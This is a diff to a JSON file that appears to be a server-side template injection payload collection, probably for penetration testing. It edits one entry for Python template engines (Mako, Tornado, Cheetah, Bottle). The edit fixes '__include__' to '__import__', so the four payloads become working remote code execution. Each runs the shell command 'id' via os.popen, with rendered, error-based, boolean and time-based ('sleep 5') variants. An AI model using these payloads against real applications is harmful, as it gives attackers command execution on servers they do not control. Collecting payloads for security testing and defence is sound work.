@@ -199,7 +199,7 @@
       "title": "Python - universal (Mako/Tornado/Cheetah/Bottle…)",
       "language": "python",
       "tags": ["python", "rce", "universal"],
-      "body": "__include__('os').popen('id').read()                       Rendered\ngetattr('', 'x' + __include__('os').popen('id').read())    Error-Based\n1 / (__include__('os').popen('id')._proc.wait() == 0)     Boolean\n__include__('os').popen('id && sleep 5').read()           Time"
+      "body": "__import__('os').popen('id').read()                       Rendered\ngetattr('', 'x' + __import__('os').popen('id').read())    Error-Based\n1 / (__import__('os').popen('id')._proc.wait() == 0)     Boolean\n__import__('os').popen('id && sleep 5').read()           Time"
     },
 
     {
